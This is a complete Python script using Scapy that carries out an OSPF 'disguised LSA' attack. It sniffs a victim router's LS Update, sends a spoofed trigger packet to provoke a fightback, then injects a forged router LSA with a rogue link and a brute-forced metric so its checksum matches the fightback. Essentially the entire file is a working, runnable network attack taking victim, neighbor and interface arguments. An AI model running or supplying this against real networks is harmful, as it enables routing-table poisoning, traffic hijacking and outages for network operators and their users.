import sys
import argparse

"""
Import Scapy
Might throw a error when importing
"""
from scapy.all import *

# global variables
lsa_position = 0

# Functions
"""
check if the incoming packet is from router 1 (victim) and find the position of the router LSA
find the position of router 1's LSA from the original packet captured
"""
def check_packet_get_pos(victim_ip, packet):
    # if the packet contains a router LSA
    if OSPF_Router_LSA in packet:
        position = 0
        # for every LSA in LS Update in the packet
        for advert in packet[OSPF_LSUpd].lsalist:
            # if a router LSA is in the advert
            if OSPF_Router_LSA in advert:
                # if the advert's advertising router and the src IP of the packet 
                # are the same as the victim
                if advert[OSPF_Router_LSA].adrouter == victim_ip and packet[IP].src == victim_ip:
                    # return true
                    lsa_position = position
                    return True
                position += 1
    # return false if not all conditions are met
    return False

"""
calculates the metric to be used in the fake checksum
"""
def get_fake_metric(fightback, spoofed, count):
    # copy the spoofed LSA to a temp
    temp = spoofed[OSPF_Router_LSA].copy()
    # generate the checksum of the fightback packet using built-in scapy function
    fightback_checksum = ospf_lsa_checksum(fightback.build())

    # bruteforce the metric, max cycles = 65535 (FFFF in hex)
    for metric in range(0, 65535):
        # set the metric of the spoofed packet
        temp[OSPF_Router_LSA].linklist[count].metric = metric
        # generate the checksum with the fake metric
        temp_checksum = ospf_lsa_checksum(temp.build())
        
        # check if the checksum is equal
        if temp_checksum == fightback_checksum:
            return metric
    return 0

# MAIN CODE

if __name__ == '__main__':
    # load ospf module from scapy
    load_contrib("ospf")

    # enable arguments from cmd
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", help="[mandatory] The interface IP address of Router 1 (Victim) whose packet we want to spoof")
    parser.add_argument("-n", "--neighbor", help="[mandatory] The interface IP address of Router 2 (Neighbor) that receives the disguised LSA")
    parser.add_argument("-i", "--iface", help="[mandatory] The interface to use for sniffing and sending packets")

    args = parser.parse_args()

    # check if all arguments are provided
    if 	(args.victim == None or args.iface == None or args.neighbor == None):
        # print the help statements of the arguments
        parser.print_help()
        # end the program
        sys.exit(1)
    
    # store the arguments in variables
    # router 1 (victim) = the router we want to spoof and send the trigger packet too
    victim = args.victim
    # router 2 (neighbor) = the router we want to send the disguised LSA packet to
    neighbor = args.neighbor
    # iface = interface that we use to sniff and send the packets
    iface = args.iface

    # print confirmation
    print(">>> Sniffing for LS Update packets from victim router on", iface)

    # Sniffing for packet using scapy sniff module
    packets = sniff(filter="proto ospf", iface=iface, stop_filter=lambda packet: check_packet_get_pos(victim, packet))

    # get the last packet sniffed and copy it
    og_packet = packets[-1].copy()
    #lsa_position = 0
    og_Router_LSA = og_packet[OSPF_LSUpd].lsalist[lsa_position][OSPF_Router_LSA]

    # print confirmation
    print(">>> Preparing trigger packet to send to victim router...")

    """
    prepare a trigger packet that is copied off of the original packet sent by victim
    """
    trigger = og_packet.copy()
    trigger_Router_LSA = trigger[OSPF_LSUpd].lsalist[lsa_position][OSPF_Router_LSA]

    # increase the sequence number of the LSA by 1
    trigger_Router_LSA.seq += 1

    # insert a fake link to make it seem like an authentic LSA
    fake_link = OSPF_Link(
        metric=1,
        toscount=0,
        type=3,
        data="255.255.255.0",
        id="10.0.66.0"
    )

    # add the fake link to the trigger packet
    trigger_Router_LSA.linklist.extend(fake_link)
     
    # increase the size for compliance of the packet
    trigger_Router_LSA.len += 12
    trigger_Router_LSA.linkcount = len(trigger_Router_LSA.linklist)

    # set the packet fields
    # adjust MAC address
    # scapy will recalculate the length, checksums etc
    trigger[Ether].src = None
    trigger[Ether].dst = None
    trigger[IP].src = neighbor
    trigger[IP].dst = victim
    trigger[IP].chksum = None
    trigger[IP].len = None
    trigger[OSPF_Hdr].src = neighbor
    trigger[OSPF_Hdr].chksum = None
    trigger[OSPF_Hdr].len = None
    trigger_Router_LSA.len = None
    trigger_Router_LSA.chksum = None

    print(">>> Preparing disguised packet to send to neighbor router...")

    # copy the original packet
    spoofed = og_packet.copy()
    spoofed_Router_LSA = spoofed[OSPF_LSUpd].lsalist[lsa_position][OSPF_Router_LSA]

    # generate a disguised LSA link
    mal_link = OSPF_Link(
        metric=1,
        toscount=0,
        type=3,
        data="255.255.255.0",
        id="10.0.100.0"
    )

    # add the disguised LSA link
    spoofed_Router_LSA.linklist.extend(mal_link)
    
    # increase the size for compliance of the packet
    spoofed_Router_LSA.len += 12
    spoofed_Router_LSA.linkcount = len(spoofed_Router_LSA.linklist)

    # increase the sequence number
    spoofed_Router_LSA.seq += 2

    # prepare a OSPF link to spoof the checksum
    checksum_link = OSPF_Link(
        metric=0,
        toscount=0,
        type=3,
        data="255.255.255.0",
        id="10.0.101.0"
    )

    # add the disguised LSA link
    spoofed_Router_LSA.linklist.extend(checksum_link)
    
    # increase the size for compliance of the packet
    spoofed_Router_LSA.len += 12
    spoofed_Router_LSA.linkcount = len(spoofed_Router_LSA.linklist)

    print(">>> Bruteforcing checksum of disguised LSA...")

    # generate a metric to fake the checksum
    count = spoofed_Router_LSA.linkcount - 1
        
    # increase the sequence of the og packet to match the spoofed packet
    og_Router_LSA.seq += 2

    fake_metric = get_fake_metric(og_Router_LSA, spoofed_Router_LSA, count)
    spoofed_Router_LSA.linklist[count][OSPF_Link].metric = fake_metric

    print(">>> Checksum spoofed, sending packets...")

    # set the packet fields
    # scapy will recalculate the length, checksums etc
    spoofed[IP].src = victim
    spoofed[IP].dst = neighbor
    spoofed[IP].chksum = None
    spoofed[IP].len = None
    spoofed[OSPF_Hdr].chksum = None
    spoofed[OSPF_Hdr].len = None
    spoofed_Router_LSA.chksum = None

    # sending packets
    sendp([trigger,spoofed], iface=iface)
    print(">>> Trigger packet:")
    trigger.show2()
    print("\n>>> Spoofed packet")
    spoofed.show2()
